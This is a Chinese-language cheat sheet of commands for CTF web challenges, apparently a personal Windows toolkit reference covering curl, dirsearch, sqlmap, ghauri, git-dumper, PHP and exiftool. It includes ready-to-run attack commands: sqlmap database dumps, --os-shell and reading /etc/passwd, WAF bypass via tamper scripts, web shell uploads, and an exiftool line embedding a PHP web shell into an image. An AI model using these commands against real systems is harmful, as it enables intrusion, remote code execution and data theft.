    工具命令速查¶

    打 Web 题手上要用的命令，一页放完。 本页只记「什么时候用」和「怎么敲」，原理回各专题看。 路径按本机写（E:\dsh\tools），PowerShell 里可直接跑。

    0. 三秒选工具¶

    你手上是什么 用什么工具 状态
    一个请求，要改参数 / 重放 curl.exe 系统自带
    不知道站里有什么文件 dirsearch 已在 PATH
    确认有注入、要拖库 sqlmap E:\dsh\tools\sqlmap
    sqlmap 被 WAF 拦 ghauri 已在 PATH
    .git 目录泄露 git-dumper 已在 PATH
    图片马 / 看元信息 exiftool E:\dsh\tools
    本地跑 PHP、算序列化 php.exe 已在 PATH（7.4）
    扫目录要字典 E:\dsh\tools\dict\ 5 本

    顺序永远是：先手工看现象 → 再上工具。 一上来就挂 sqlmap，多半是浪费时间。

    1. curl —— 重放和改包¶

    ⚠️ PowerShell 里必须写 curl.exe，curl 是 Invoke-WebRequest 的别名，不认这些参数。

    curl.exe [选项] URL

    常用参数¶

    参数 作用
    -X POST 指定方法（GET 不用写）
    -d "a=1&b=2" 表单请求体
    --data-raw '{"k":1}' 发 JSON 原文（不解析 @）
    --data-urlencode "c=1+2" 自动 URL 编码（值里有 + / = & 必用）
    -H "头: 值" 加请求头，可写多次
    -b "a=1" / -b 文件 带 Cookie
    -c 文件 保存响应里的 Cookie
    -i 输出带响应头
    -I 只发 HEAD
    -v 打印完整收发（调试神器）
    -o NUL 丢掉输出
    -L 跟随 302
    -k 忽略证书错误（走 Burp 时）
    -x http://127.0.0.1:8080 走代理，把请求塞进 Burp
    --max-time 20 超时秒数

    直接抄¶

    # GET
curl.exe -s "http://target/search?q=1&page=2"

# POST 表单
curl.exe -s -X POST "http://target/login" -d "user=admin&pass=123"

# POST JSON
curl.exe -s -X POST "http://target/api/fire" `
  -H "Content-Type: application/json" `
  --data-raw '{"damage":999999}'

# 先拿 Cookie 再访问
curl.exe -s -c $env:TEMP\ck.txt "http://target/login" -d "user=a&pass=b"
curl.exe -s -b $env:TEMP\ck.txt "http://target/profile"

# 上传文件
curl.exe -s -X POST "http://target/upload" -F "file=@E:\dsh\shell.php"

# 只看状态码
curl.exe -s -o NUL -w "%{http_code}`n" "http://target/"

# 塞进 Burp 看
curl.exe -s -x http://127.0.0.1:8080 -k "https://target/api/state"

    坑¶

    • PowerShell 里 JSON 别加反斜杠：'{\"a\":1}' 会把反斜杠一起发出去。单引号直写即可：'{"a":1}'
    • 输出是压缩的一行 JSON，用 | ConvertFrom-Json 展开（本机没装 jq）
    • 卡住不加超时 → --max-time 10

    2. dirsearch —— 扫目录 / 找泄露¶

    dirsearch -u URL [选项]
    参数 作用
    -e php,html,txt,zip,bak 扩展名
    -w 字典路径 换字典
    -t 30 线程数
    -x 403,404 排除状态码
    -r 递归
    -o out.txt 存结果 
    # 常规一把
dirsearch -u http://target/ -e php,html,txt,zip,bak

# 换大字典（慢，慎用）
dirsearch -u http://target/ -w E:\dsh\tools\dict\directory-list-2.3-medium.txt -t 30 -x 403,404

    坑： 先用自带字典跑一遍，别一上来就 2.3-medium（慢，还容易被封 IP）。

    3. sqlmap —— SQL 注入¶

    没进 PATH，用 python 跑：

    python E:\dsh\tools\sqlmap\sqlmap.py -u "http://target/news.php?id=1" --batch

    --batch 必加，否则会卡在交互提问上。

    从确认到拖库¶

    $S = 'E:\dsh\tools\sqlmap\sqlmap.py'

# 1) 确认注入（默认等级先跑）
python $S -u "http://target/?id=1" --batch

# 2) 看库 / 看表 / 看列 / 拖数据
python $S -u "http://target/?id=1" --batch --dbs
python $S -u "http://target/?id=1" --batch -D ctf --tables
python $S -u "http://target/?id=1" --batch -D ctf -T flag --dump

# 3) 当前用户、是否 DBA
python $S -u "http://target/?id=1" --batch --current-db --current-user --is-dba

    换注入位置¶

    # POST
python $S -u "http://target/login.php" --data "user=1&pass=1" --batch

# 带 Cookie
python $S -u "http://target/user.php?id=1" --cookie "PHPSESSID=abc" --batch

# 直接吃 Burp 存下来的整个请求（最省事）
python $S -r E:\dsh\req.txt --batch

    Burp 里右键 → Save item，存成 req.txt 就能喂给 -r。

    进阶¶

    参数 什么时候用
    --level 3 --risk 2 默认跑不出来时往上加（3/3 会影响数据，慎用）
    --dbms mysql 已知数据库，省时间
    --technique=BEUSTQ 只要某种注入（B布尔/E报错/U联合/S堆叠/T时间/Q内联）
    --tamper=space2comment 有 WAF 时改用 tamper/ 里的脚本
    --os-shell 有写权限时拿 shell
    --file-read=/etc/passwd 读文件
    --proxy=http://127.0.0.1:8080 看它到底发了什么
    --flush-session 改过参数还用旧结果时清缓存

    4. ghauri —— sqlmap 的备用引擎¶

    ghauri -u "http://target/?id=1" --batch
ghauri -u "http://target/?id=1" --batch --dbs
ghauri -r E:\dsh\req.txt --batch

    语法和 sqlmap 几乎一样。sqlmap 被 WAF 拦死、或者结果对不上时，换它交叉验证。

    5. git-dumper —— .git 源码泄露¶

    先确认泄露：

    curl.exe -s "http://target/.git/HEAD"
# 回 "ref: refs/heads/main" 就是中招了

    拉下来：

    git-dumper http://target/.git/ E:\dsh\ctf-work\dumped
cd E:\dsh\ctf-work\dumped
git log --oneline --all
git show <hash>
git ls-files

    坑：

    • URL 必须以 /.git/ 结尾
    • 目录 403 也别放弃 —— 它照样会试 objects/
    • 拉完先 git log --all，flag 常在被删掉的提交里

    手工兜底（没有 git-dumper 时）：

    curl.exe -s "http://target/.git/HEAD"
curl.exe -s "http://target/.git/refs/heads/main"
curl.exe -s "http://target/.git/index"

    6. php.exe —— 本地跑 PHP（7.4）¶

    已在 PATH，php 就能用；绝对路径是 E:\dsh\tools\php74\php.exe。

    php -v

# 起本地靶场（-t 指定根目录，不加会 404）
php -S 127.0.0.1:8080 -t E:\dsh\ctf-work

# 语法检查（写马之前先验一下，省得传上去 500）
php -l shell.php

# 算序列化 / 反序列化
php -r "echo serialize(array('a'=>1));"
php -r "var_dump(unserialize('a:1:{s:1:\"a\";i:1;}'));"

    7. exiftool —— 图片元信息 / 图片马¶

    $ET = 'E:\dsh\tools\exiftool-13.59_64\exiftool.exe'

$ET 1.jpg                                  # 看全部元数据
$ET -Comment="HELLO" 1.jpg                 # 改注释
$ET -Comment="<?php system(\$_GET[1]);?>" -o shell.jpg 1.jpg   # 写马到副本

    上传题里「图片马 + 文件包含」这套经常用到。

    9. 十秒探路（先跑这个）¶

    不知道站里有什么时，先扫这几个常见泄露点，一条命令：

    $base = 'http://target'
'/robots.txt','/.git/HEAD','/www.zip','/backup.zip','/.DS_Store',
'/phpinfo.php','/index.php~','/.index.php.swp','/flag','/api/' |
  ForEach-Object { '{0,-22} {1}' -f $_, (curl.exe -s -o NUL -w '%{http_code}' "$base$_") }

    看到 200 的再去细看，403 的记下来（有时候换方法就通了）。

    11. Windows 上通用的四个坑¶

    1. curl 不是 curl —— 一律写 curl.exe
    2. 引号：PowerShell 单引号是字面量（和 Linux 一样），但别加 \ 转义
    3. 路径：全用 \，含空格要加引号
    4. 交互卡住：sqlmap 加 --batch，curl 加 --max-time
